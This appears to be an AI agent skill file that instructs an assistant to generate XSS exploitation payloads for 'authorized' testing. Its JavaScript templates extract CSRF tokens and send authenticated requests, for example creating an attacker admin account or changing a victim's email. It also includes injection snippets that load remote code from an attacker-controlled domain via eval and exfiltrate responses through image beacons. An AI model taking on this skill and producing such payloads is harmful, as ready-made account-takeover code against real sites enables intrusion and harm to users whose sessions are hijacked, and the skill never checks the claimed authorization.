---
name: xss-poc-generator
description: Use when creating XSS exploitation payloads for authorized security testing - generates JavaScript payloads that perform authenticated actions (with or without CSRF tokens) when HttpOnly cookies prevent direct session theft
allowed-tools: Read, Write, AskUserQuestion, TodoWrite
---

# Generating XSS Action Payloads

**Generates JavaScript payloads for authorized XSS exploitation when HttpOnly cookies prevent session theft. Supports both CSRF-protected and unprotected endpoints.**

## When to Use

Use this skill when:

- You've identified an XSS vulnerability but session cookies are HttpOnly
- You need to exploit XSS by performing authenticated actions instead of credential theft
- You want payload code based on specific engagement context (not generic templates)

**NOT for**: Generic XSS payloads, cookie theft, or attacks that don't require authenticated requests.

## Quick Reference

| Phase | Purpose                                                    |
| ----- | ---------------------------------------------------------- |
| 1     | Gather inputs (full HTTP request + optional CSRF token HTML) |
| 2     | Parse inputs and generate extraction code (if token exists)  |
| 3     | Generate payload structure                                   |
| 4     | Add error handling and optional features                     |
| 5     | Output final payload with documentation                      |
| 6     | Verify payload correctness (user feedback)                   |

## Core Workflow

### Phase 1: Gather Scenario Details

Use AskUserQuestion to collect the raw inputs:

```markdown
Question 1: "Paste the full HTTP request you want the payload to perform"

User provides complete HTTP request, e.g.:
POST /api/admin/users HTTP/1.1
Host: target.com
Content-Type: application/json

{"username":"attacker","role":"admin","password":"P@ssw0rd!"}
```

```markdown
Question 2 (OPTIONAL): "Does the target use CSRF protection? If yes, paste the HTML containing the token"

User provides one of:
- Raw HTML snippet: `<meta name="csrf-token" content="abc123">`
- Raw HTML snippet: `<input type="hidden" name="_token" value="xyz789">`
- API endpoint description: "GET /api/csrf returns {token: '...'}"
- "No" or skips - endpoint has no CSRF protection
```

```markdown
Question 3 (REQUIRED if CSRF token exists): "What page/URL contains this CSRF token?"

User provides:
- Same endpoint as target action: "/my-account/change-email" (form page = action page)
- Different endpoint: "/users" (token on different page, must fetch first)
- Current page: "The XSS injection page already has the token" (rare, but possible)
```

```markdown
Question 4: "Any constraints?"
Options (multiSelect: true):

1. Needs URL encoding (reflected XSS context)
2. Must be compact/minified
3. Needs exfiltration of response
4. No constraints
```

From the HTTP request, automatically extract:
- Target endpoint and method
- Content-Type header
- CSRF header name (if present in request)
- Request body structure

**See**: [references/scenario-patterns.md](references/scenario-patterns.md) for common scenario templates and input validation.

### Phase 2: Parse Inputs and Generate Extraction Code

**Parse the HTTP request to extract:**

- **Method**: First word of request line (GET, POST, PUT, PATCH, DELETE)
- **Endpoint**: URL path from request line (this is the **target action endpoint**)
- **Content-Type**: From headers (determines body serialization)
- **CSRF header**: Look for X-CSRF-Token, X-XSRF-Token, csrf-token, etc. (may be absent)
- **Body**: Everything after blank line, preserve structure

**If CSRF token HTML was provided, determine fetch strategy:**

**CRITICAL**: CSRF tokens are typically NOT present on the XSS injection page. Determine token location:

| User's Token Page Answer | Payload Strategy |
| ------------------------ | ---------------- |
| Same as target endpoint  | Single GET to fetch token + form, then POST |
| Different endpoint       | GET to token page, extract token, then POST to target |
| "Current page has token" | Extract from `document` directly (no fetch needed) |
| No CSRF token            | Skip token extraction, use simpler template |

**Token Extraction Code (within fetched HTML):**

| HTML Pattern                      | Generated Code                                      |
| --------------------------------- | --------------------------------------------------- |
| `<meta name="X" content="...">`   | `doc.querySelector('meta[name="X"]').content`       |
| `<input name="X" value="...">`    | `doc.querySelector('input[name="X"]').value`        |
| `<input type="hidden" name="X">`  | `doc.querySelector('input[name="X"]').value`        |
| Data attribute `data-csrf="..."`  | `doc.body.dataset.csrf`                             |
| API endpoint                      | `await fetch('/api/csrf').then(r=>r.json()).then(d=>d.token)` |

**Fetch Method**: Use `fetch()` + `DOMParser` for HTML parsing:

```javascript
fetch(tokenPageUrl, { credentials: "include" })
  .then(response => response.text())
  .then(html => {
    var parser = new DOMParser();
    var doc = parser.parseFromString(html, "text/html");
    const csrfToken = [GENERATED_EXTRACTION_CODE];
    // ... proceed with POST
  })
```

**See**: [references/validation-rules.md](references/validation-rules.md) for input validation and common pitfalls.

### Phase 3: Generate Payload Structure

Using parsed data from Phase 2, populate the appropriate template based on token location:

**Template A: Two-Stage (Token on same/different page - MOST COMMON):**

```javascript
(function () {
  // Stage 1: Fetch page containing CSRF token
  fetch("[TOKEN_PAGE_URL]", { credentials: "include" })
    .then(response => response.text())
    .then(html => {
      var parser = new DOMParser();
      var doc = parser.parseFromString(html, "text/html");

      // Extract CSRF token from fetched page
      const csrfToken = [GENERATED_EXTRACTION_CODE];

      if (!csrfToken) {
        console.error("CSRF token not found");
        return;
      }

      // Stage 2: Send authenticated request with token
      fetch("[PARSED_ENDPOINT]", {
        method: "[PARSED_METHOD]",
        headers: {
          "Content-Type": "[PARSED_CONTENT_TYPE]",
          "[PARSED_CSRF_HEADER]": csrfToken,
        },
        body: [PARSED_BODY],
        credentials: "same-origin",
      })
        .then((response) => response.ok && console.log("Success"))
        .catch((error) => console.error(error));
    })
    .catch((error) => console.error("Token fetch failed:", error));
})();
```

**Template B: Current Page Token (RARE - token on XSS injection page):**

```javascript
(function () {
  // Extract CSRF token from current page
  const csrfToken = [GENERATED_EXTRACTION_CODE];

  if (!csrfToken) {
    console.error("CSRF token not found");
    return;
  }

  // Send request
  fetch("[PARSED_ENDPOINT]", {
    method: "[PARSED_METHOD]",
    headers: {
      "Content-Type": "[PARSED_CONTENT_TYPE]",
      "[PARSED_CSRF_HEADER]": csrfToken,
    },
    body: [PARSED_BODY],
    credentials: "same-origin",
  })
    .then((response) => response.ok && console.log("Success"))
    .catch((error) => console.error(error));
})();
```

**Template C: No CSRF Token:**

```javascript
(function () {
  fetch("[PARSED_ENDPOINT]", {
    method: "[PARSED_METHOD]",
    headers: {
      "Content-Type": "[PARSED_CONTENT_TYPE]",
    },
    body: [PARSED_BODY],
    credentials: "same-origin",
  })
    .then((response) => response.ok && console.log("Success"))
    .catch((error) => console.error(error));
})();
```

**Body serialization based on Content-Type:**

| Content-Type                      | Body Format                             |
| --------------------------------- | --------------------------------------- |
| `application/json`                | `JSON.stringify({...})` with parsed JSON body |
| `application/x-www-form-urlencoded` | `new URLSearchParams({...})`          |
| `multipart/form-data`             | `new FormData()` with appended fields   |

**See**: [references/payload-templates.md](references/payload-templates.md) for complete template variations by scenario type.

### Phase 4: Add Error Handling and Optional Features

**Minimal error handling** (default, only if CSRF token is used):

```javascript
if (!csrfToken) {
  console.error("CSRF token not found");
  return;
}
```

**Optional enhancements** (based on user constraints):

| Feature           | When to Include                            | Code Pattern                           |
| ----------------- | ------------------------------------------ | -------------------------------------- |
| Exfiltration      | User requested response confirmation       | `new Image().src = 'https://...'`      |
| Minification      | Reflected XSS or tight injection point     | Remove whitespace, shorten var names   |
| Response handling | User needs to verify success               | Parse response, check status code      |
| Async/await       | API endpoint token extraction              | Convert to async function              |

**See**: [references/error-handling.md](references/error-handling.md) for comprehensive error handling strategies.

### Phase 5: Output Final Payload

**Deliverable format**:

````markdown
## Generated XSS Action Payload

### Scenario Summary

- **CSRF Token**: [location or "None - endpoint unprotected"]
- **Target Action**: [description]
- **Constraints**: [list]

### Full Payload (production)

```javascript
[COMPLETE_PAYLOAD_CODE]
```

### Minified Version (if requested)

```javascript
[MINIFIED_VERSION]
```

### Usage Instructions

1. Host this payload at `https://attacker-controlled-domain.com/payload.js`
2. Inject via XSS: `<script src="https://attacker-controlled-domain.com/payload.js"></script>`
3. Alternative injection: `<img src=x onerror="fetch('https://...').then(r=>r.text()).then(eval)">`

### Expected Behavior

- Token extraction: [what gets extracted, or "N/A - no CSRF token"]
- Request sent to: [endpoint]
- Expected response: [description]
- Success indicator: [how to verify]

### Testing Recommendations

1. Test in browser console first (if CSRF token: `console.log(csrfToken)` to verify extraction)
2. Verify target endpoint accepts the request format
3. If CSRF token used: Check header name matches application expectations
4. Test same-origin constraint in browser DevTools
````

**See**: [references/output-formatting.md](references/output-formatting.md) for alternative output formats.

### Phase 6: Verify Payload Correctness

Ask user via AskUserQuestion:

```markdown
Question: "Does this payload match your engagement requirements?"
Options:

1. Yes, looks correct
2. Needs adjustment (specify what)
3. Different approach needed (describe)
```

**If "Needs adjustment"**: Return to Phase 3 with updated constraints.
**If "Different approach"**: Return to Phase 1 for new scenario.

## Key Principles

1. **Contextual generation** - Parse user's actual HTML and HTTP request, no guessing
2. **Minimal by default** - Include only requested features, avoid over-engineering
3. **Educational value** - Output includes explanations, not just code
4. **Production-ready** - Code should work as-is without debugging

## Common Patterns

**Pattern 1: Email change with hidden input token (TWO-STAGE)**

- Token: Hidden input on `/my-account/change-email` page
- Action: POST form data to `/my-account/change-email`
- Token Page = Action Page (fetch once, extract token, then POST)
- Constraint: Same-origin

**Pattern 2: Admin creation with meta tag token (TWO-STAGE)**

- Token: Meta tag on `/users` page
- Action: POST JSON to `/users/save` (different endpoint)
- Token Page ≠ Action Page (fetch `/users` first, extract token, POST to `/users/save`)
- Constraint: Same-origin

**Pattern 3: ASP.NET ViewState (TWO-STAGE)**

- Token: Multiple hidden inputs (`__VIEWSTATE`, `__EVENTVALIDATION`) on form page
- Action: POST form data to same page (ASP.NET postback model)
- Token Page = Action Page (fetch page, extract all ViewState fields, then POST)
- Constraint: Must include ALL form fields

**Pattern 4: Account takeover (no CSRF)**

- Token: None - endpoint lacks CSRF protection
- Action: PATCH `/api/user/email` with attacker email
- Single-stage (no token fetch needed)
- Constraint: Need response exfiltration

**See**: [examples/](examples/) for complete worked examples of each pattern.

## Anti-Patterns to Avoid

❌ **Assuming token on current page** - ALWAYS ask user where token is located, default to two-stage fetch
❌ **Extracting from `document` without fetch** - Token is rarely on XSS injection page
❌ **Guessing instead of parsing** - Always extract from user's provided HTML/HTTP request
❌ **Including features not requested** - Keep payload minimal (no unnecessary exfiltration, logging, etc.)
❌ **Using outdated APIs** - Prefer `fetch()` over `XMLHttpRequest`
❌ **Hardcoding assumptions** - Parse CSRF header name from user's request, don't assume `X-CSRF-Token`
❌ **Ignoring same-origin constraints** - If user says same-origin, don't add cross-origin exfiltration
❌ **Over-explaining defenses** - Focus on payload generation, not comprehensive mitigation strategies

## Integration

### Called By

- Red team agents during authorized engagements
- Security testers via direct invocation
- `/software-testing` command for authorized testing workflows

### Requires (invoke before starting)

None - standalone skill

### Calls (during execution)

None - terminal skill (generates output, doesn't delegate)

### Pairs With (conditional)

| Skill                 | Trigger           | Purpose                           |
| --------------------- | ----------------- | --------------------------------- |
| `xss-detection`       | Pre-exploitation  | Identify XSS vuln before payload  |
| `csrf-analysis`       | Token validation  | Analyze CSRF protection mechanism |
| `payload-obfuscation` | Evasion required  | Obfuscate payload for WAF bypass  |

## Limitations

- **Does not discover XSS** - Assumes you already have XSS injection point
- **Does not bypass CSP** - Payloads assume no Content-Security-Policy restrictions (or external script allowed)
- **Does not handle captchas** - Assumes no anti-automation on target action
- **Does not test payloads** - User must validate in engagement environment

## Related Skills

- `xss-detection` - Finding XSS vulnerabilities
- `csrf-analysis` - Understanding CSRF protections
- `payload-obfuscation` - WAF evasion techniques
- `authorized-testing-workflows` - Engagement setup and scope validation

## Changelog

See [.history/CHANGELOG](.history/CHANGELOG) for version history.
